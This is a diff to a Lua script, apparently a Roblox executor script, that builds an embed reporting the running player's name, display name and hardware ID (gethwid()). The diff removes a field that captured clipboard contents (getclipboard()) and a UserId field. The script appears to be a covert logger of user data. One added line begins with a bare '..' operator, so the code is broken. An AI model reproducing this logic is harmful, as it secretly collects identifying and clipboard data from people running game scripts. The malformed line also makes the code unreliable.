@@ -212,18 +212,13 @@ end
                 },
                 ["fields"] = {
                     {
-                        ["name"] = "名称(Name)",
-                        ["value"] = "||"..player.Name.."||",
+                        ["name"] = "用户名(Name)",
+                        ["value"] = ..game.Players.LocalPlayer.Character.Name,
                         ["inline"] = true
                     },
                     {
                         ["name"] = "昵称(DisplayName)",
                         ["value"] = player.DisplayName,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "UserId",
-                        ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. player.UserId .. "/profile") .. ")||",
                         ["inline"] = true
                     },
                     {
@@ -254,11 +249,6 @@ end
                     {
                         ["name"] = "HWID",
                         ["value"] = gethwid(),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "剪贴板",
-                        ["value"] = getclipboard(),
                         ["inline"] = true
                     },
                     {
